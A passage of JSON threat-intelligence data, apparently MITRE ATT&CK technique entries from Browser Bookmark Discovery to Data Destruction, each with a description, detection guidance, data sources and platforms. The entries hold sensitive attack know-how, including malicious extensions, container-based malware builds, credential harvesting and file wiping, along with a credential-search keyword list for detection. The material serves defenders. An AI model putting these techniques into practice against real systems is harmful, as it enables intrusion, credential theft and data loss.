                "description": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\n\nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.",
                "url": "https://attack.mitre.org/techniques/T1217",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "File: File Access"
                ],
                "detection": "Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1176",
                "name": "Browser Extensions",
                "description": "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS)\n\nOnce the extension is installed, it can browse to websites in the background,(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser (including credentials)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.(Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control.(Citation: Chrome Extension C2 Malware)",
                "url": "https://attack.mitre.org/techniques/T1176",
                "data_sources": [
                    "Command: Command Execution",
                    "Process: Process Creation",
                    "Network Traffic: Network Connection Creation",
                    "Windows Registry: Windows Registry Key Creation",
                    "File: File Creation"
                ],
                "detection": "Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.\n\nMonitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.\n\nOn macOS, monitor the command line for usage of the profiles tool, such as <code>profiles install -type=configuration</code>. Additionally, all installed extensions maintain a <code>plist</code> file in the <code>/Library/Managed Preferences/username/</code> directory. Ensure all listed files are in alignment with approved extensions.(Citation: xorrior chrome extensions macOS)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "persistence"
                ]
            },
            {
                "id": "T1110",
                "name": "Brute Force",
                "description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.",
                "url": "https://attack.mitre.org/techniques/T1110",
                "data_sources": [
                    "User Account: User Account Authentication",
                    "Application Log: Application Log Content"
                ],
                "detection": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1612",
                "name": "Build Image on Host",
                "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)\n\nAn adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it�s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. ",
                "url": "https://attack.mitre.org/techniques/T1612",
                "data_sources": [
                    "Image: Image Creation",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Monitor for unexpected Docker image build requests to the Docker daemon on hosts in the environment. Additionally monitor for subsequent network communication with anomalous IPs that have never been seen before in the environment that indicate the download of malicious code.",
                "permissions": [
                    "User",
                    "root"
                ],
                "platforms": [
                    "Containers"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1115",
                "name": "Clipboard Data",
                "description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nIn Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)",
                "url": "https://attack.mitre.org/techniques/T1115",
                "data_sources": [
                    "Process: OS API Execution",
                    "Command: Command Execution"
                ],
                "detection": "Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1580",
                "name": "Cloud Infrastructure Discovery",
                "description": "An adversary may attempt to discover resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, as well as the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project(Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI)\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020) Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.",
                "url": "https://attack.mitre.org/techniques/T1580",
                "data_sources": [
                    "Instance: Instance Metadata",
                    "Instance: Instance Enumeration",
                    "Snapshot: Snapshot Metadata",
                    "Snapshot: Snapshot Enumeration",
                    "Cloud Storage: Cloud Storage Metadata",
                    "Cloud Storage: Cloud Storage Enumeration",
                    "Volume: Volume Metadata",
                    "Volume: Volume Enumeration"
                ],
                "detection": "Establish centralized logging for the activity of cloud infrastructure components. Monitor logs for actions that could be taken to gather information about cloud infrastructure, including the use of discovery API calls by new or unexpected users. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "IaaS"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1538",
                "name": "Cloud Service Dashboard",
                "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
                "url": "https://attack.mitre.org/techniques/T1538",
                "data_sources": [
                    "User Account: User Account Authentication",
                    "Logon Session: Logon Session Creation"
                ],
                "detection": "Monitor account activity logs to see actions performed and activity associated with the cloud service management console. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console.(Citation: AWS Console Sign-in Events)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Azure AD",
                    "Office 365",
                    "IaaS",
                    "Google Workspace"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1526",
                "name": "Cloud Service Discovery",
                "description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. \n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)\n\nStormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)",
                "url": "https://attack.mitre.org/techniques/T1526",
                "data_sources": [
                    "Cloud Service: Cloud Service Metadata",
                    "Cloud Service: Cloud Service Enumeration"
                ],
                "detection": "Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nNormal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Google Workspace"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1059",
                "name": "Command and Scripting Interpreter",
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.",
                "url": "https://attack.mitre.org/techniques/T1059",
                "data_sources": [
                    "Command: Command Execution",
                    "Process: Process Creation",
                    "Module: Module Load",
                    "Script: Script Execution"
                ],
                "detection": "Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1043",
                "name": "Commonly Used Port",
                "description": "**This technique has been deprecated. Please use [Non-Standard Port](https://attack.mitre.org/techniques/T1571) where appropriate.**\n\nAdversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
                "url": "https://attack.mitre.org/techniques/T1043",
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1092",
                "name": "Communication Through Removable Media",
                "description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
                "url": "https://attack.mitre.org/techniques/T1092",
                "data_sources": [
                    "Drive: Drive Creation",
                    "Drive: Drive Access"
                ],
                "detection": "Monitor file access on removable media. Detect processes that execute when removable media is mounted.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1175",
                "name": "Component Object Model and Distributed COM",
                "description": "**This technique has been deprecated. Please use [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Component Object Model](https://attack.mitre.org/techniques/T1559/001).**\n\nAdversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. \n\nCOM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nAdversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)\n\nAdversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.",
                "url": "https://attack.mitre.org/techniques/T1175",
                "detection": "Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1086), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)\n\nMonitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\n\nMonitor for any influxes or abnormal increases in Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic.",
                "permissions": [
                    "Administrator",
                    "SYSTEM",
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "lateral-movement",
                    "execution"
                ]
            },
            {
                "id": "T1586",
                "name": "Compromise Accounts",
                "description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).",
                "url": "https://attack.mitre.org/techniques/T1586",
                "detection": "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "resource-development"
                ]
            },
            {
                "id": "T1554",
                "name": "Compromise Client Software Binary",
                "description": "Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.\n\nAdversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.",
                "url": "https://attack.mitre.org/techniques/T1554",
                "data_sources": [
                    "File: File Modification",
                    "File: File Creation",
                    "File: File Deletion",
                    "File: File Metadata"
                ],
                "detection": "Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. \n\nConsider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "persistence"
                ]
            },
            {
                "id": "T1584",
                "name": "Compromise Infrastructure",
                "description": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)",
                "url": "https://attack.mitre.org/techniques/T1584",
                "detection": "Much of this activity will take place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "resource-development"
                ]
            },
            {
                "id": "T1609",
                "name": "Container Administration Command",
                "description": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)",
                "url": "https://attack.mitre.org/techniques/T1609",
                "data_sources": [
                    "Command: Command Execution"
                ],
                "detection": "Container administration service activities and executed commands can be captured through logging of process execution with command-line arguments on the container and the underlying host. In Docker, the daemon log provides insight into events at the daemon and container service level. Kubernetes system component logs may also detect activities running in and out of containers in the cluster. ",
                "platforms": [
                    "Containers"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1613",
                "name": "Container and Resource Discovery",
                "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment�s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary�s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ",
                "url": "https://attack.mitre.org/techniques/T1613",
                "data_sources": [
                    "Cluster: Cluster Metadata",
                    "Container: Container Enumeration",
                    "Container: Container Metadata",
                    "Pod: Pod Enumeration",
                    "Pod: Pod Metadata",
                    "Application Log: Application Log Content"
                ],
                "detection": "Establish centralized logging for the activity of container and Kubernetes cluster components. This can be done by deploying logging agents on Kubernetes nodes and retrieving logs from sidecar proxies for application pods to detect malicious activity at the cluster level.\n\nMonitor logs for actions that could be taken to gather information about container infrastructure, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications. ",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Containers"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1136",
                "name": "Create Account",
                "description": "Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",
                "url": "https://attack.mitre.org/techniques/T1136",
                "data_sources": [
                    "User Account: User Account Creation",
                    "Process: Process Creation",
                    "Command: Command Execution"
                ],
                "detection": "Monitor for processes and command-line parameters associated with account creation, such as <code>net user</code> or <code>useradd</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.\n\nCollect usage logs from cloud administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.",
                "permissions": [
                    "Administrator"
                ],
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ],
                "tactics": [
                    "persistence"
                ]
            },
            {
                "id": "T1543",
                "name": "Create or Modify System Process",
                "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. (Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. (Citation: OSX Malware Detection).  ",
                "url": "https://attack.mitre.org/techniques/T1543",
                "data_sources": [
                    "Service: Service Creation",
                    "Service: Service Modification",
                    "Process: Process Creation",
                    "Process: OS API Execution",
                    "Command: Command Execution",
                    "Windows Registry: Windows Registry Key Creation",
                    "Windows Registry: Windows Registry Key Modification",
                    "File: File Creation",
                    "File: File Modification"
                ],
                "detection": "Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  \n\nCommand-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\nMonitor for changes to files associated with system-level processes.",
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ],
                "tactics": [
                    "persistence",
                    "privilege-escalation"
                ]
            },
            {
                "id": "T1555",
                "name": "Credentials from Password Stores",
                "description": "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
                "url": "https://attack.mitre.org/techniques/T1555",
                "data_sources": [
                    "Process: Process Creation",
                    "File: File Access",
                    "Command: Command Execution",
                    "Process: OS API Execution",
                    "Process: Process Access"
                ],
                "detection": "Monitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications.",
                "permissions": [
                    "Administrator"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1485",
                "name": "Data Destruction",
                "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)",
                "url": "https://attack.mitre.org/techniques/T1485",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "File: File Modification",
                    "File: File Deletion",
                    "Image: Image Deletion",
                    "Instance: Instance Deletion",
                    "Snapshot: Snapshot Deletion",
                    "Cloud Storage: Cloud Storage Deletion",
                    "Volume: Volume Deletion"
                ],
